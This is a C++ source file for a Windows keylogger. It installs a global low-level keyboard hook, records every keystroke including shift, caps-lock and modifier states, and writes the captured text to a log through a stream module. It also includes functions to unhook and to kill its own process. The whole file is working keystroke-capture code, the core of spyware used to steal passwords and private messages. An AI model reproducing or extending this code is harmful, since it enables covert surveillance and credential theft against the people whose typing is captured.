#include "keyhook.h"
#include "stream.h"

HHOOK hook = nullptr;
std::string key_log;

bool caps = false;
bool shift = false;

LRESULT key_hook::RunHook(int n_code, WPARAM wparam, LPARAM lparam) {
	if (n_code < 0) {
		CallNextHookEx(hook, n_code, wparam, lparam);
	}
	auto *kb_dll_hook_struct = (KBDLLHOOKSTRUCT *)lparam;

	if (wparam==WM_KEYDOWN || wparam==WM_SYSKEYDOWN) {
		DWORD key = kb_dll_hook_struct->vkCode;

		if (key==VK_CAPITAL) {
			caps = !caps;

			if (!caps) {
				std::string key_name = key_const::AddKey(key, caps, shift);
				key_name.insert(1, "/");
				key_log += key_name;
			} else {
				key_log += key_const::AddKey(key, caps, shift);
			}
		} else if (key==VK_SHIFT || key==VK_RSHIFT || key==VK_LSHIFT) {

			if (!shift) {
				shift = true;
				key_log += key_const::AddKey(key, caps, shift);
			}
		} else {
			key_log += key_const::AddKey(key, caps, shift);
		}
	}

	if (kb_dll_hook_struct->vkCode==VK_RETURN) {
		key_log += '\n';
	} else if (wparam==WM_KEYUP || wparam==WM_SYSKEYUP) {
		DWORD key = kb_dll_hook_struct->vkCode;

		if (key==VK_SHIFT || key==VK_RSHIFT || key==VK_LSHIFT) {
			shift = false;
		}

		if (key==VK_CONTROL
				|| key==VK_LCONTROL
				|| key==VK_RCONTROL
				|| key==VK_MENU
				|| key==VK_LMENU
				|| key==VK_RMENU
				|| key==VK_NUMLOCK
				|| key==VK_LWIN
				|| key==VK_RWIN
				|| key==VK_SHIFT
				|| key==VK_RSHIFT
				|| key==VK_LSHIFT) {
			std::string key_name = key_const::AddKey(kb_dll_hook_struct->vkCode, caps, shift);
			key_name.insert(1, "/");
			key_log += key_name;
		}
	}
	stream::WriteLog(key_log);
	key_log.clear();
	return CallNextHookEx(hook, n_code, wparam, lparam);
}

bool key_hook::InstallHook() {
	hook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)RunHook, GetModuleHandle(nullptr), NULL);
	return hook==nullptr;
}

bool key_hook::UninstallHook() {
	bool b = UnhookWindowsHookEx(hook);
	hook = nullptr;

	return b;
}

bool key_hook::KillProcess() {
	HANDLE handle;

	HandleMessage(false);
	handle = OpenProcess(SYNCHRONIZE | PROCESS_TERMINATE, TRUE, GetCurrentProcessId());
	return TerminateProcess(handle, 0);
}

void key_hook::HandleMessage(bool log_msg) {
	MSG msg;
	while (GetMessage(&msg, nullptr, 0, 0) && log_msg) {
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
}
